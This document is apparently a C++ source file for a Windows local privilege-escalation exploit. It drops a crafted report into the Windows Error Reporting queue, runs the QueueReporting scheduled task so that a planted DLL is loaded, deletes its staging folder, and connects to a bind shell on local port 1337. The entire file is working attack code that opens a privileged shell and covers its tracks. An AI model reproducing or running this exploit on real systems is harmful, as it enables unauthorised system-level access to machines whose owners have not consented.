// WerTrigger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <strsafe.h>
#include <tchar.h>
#include "TcpClient.h"

int wmain(int argc, wchar_t** argv)
{

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

//	return S_OK;

	wprintf_s(L"[+] Windows Error Reporting Trigger by @404death !\n");

	// command line 1
	WCHAR cmdLine1[BUFSIZE]; 
	ZeroMemory(cmdLine1, BUFSIZE);
	StringCchCat(cmdLine1, BUFSIZE, L"cmd /c mkdir C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");

	CreateProcess(nullptr, cmdLine1, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	// command line 2
	WCHAR cmdLine2[BUFSIZE]; //	
	ZeroMemory(cmdLine2, BUFSIZE);
	StringCchCat(cmdLine2, BUFSIZE, L"cmd /c copy Report.wer C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");

	CreateProcess(nullptr, cmdLine2, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	// submitting problem report cmd4

	WCHAR cmdLine4[BUFSIZE]; 
	ZeroMemory(cmdLine4, BUFSIZE);
	StringCchCat(cmdLine4, BUFSIZE, L"cmd /c schtasks /run /TN \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" > nul 2>&1");

	CreateProcess(nullptr, cmdLine4, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	Sleep(2000);

	// clean dir
	WCHAR cmdLine3[BUFSIZE]; 
	ZeroMemory(cmdLine3, BUFSIZE);
	StringCchCat(cmdLine3, BUFSIZE, L"cmd /c rmdir /s/q C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\a_b_c_d_e > nul 2>&1");

	CreateProcess(nullptr, cmdLine3, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	// TCP connecting

	TcpClient tcpClient;
	int iRes = 0;

	// Try to trigger DLL loading 
	wprintf_s(L"[+] Trigger launched.\n");
	wprintf_s(L"[*] TCP connecting...\n");

	// Wait a bit before trying to connect to the bind shell.
	//  
	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");

	iRes = tcpClient.connectTCP("127.0.0.1", "1337");

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");


		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[-] Exploit failed.");
	}
	else
	{
		//	system("taskkill /F /IM rundll32.exe /T > NUL 2>&1");
		wprintf_s(L"[+] Exploit successfull.");
	}

	return 0;

}
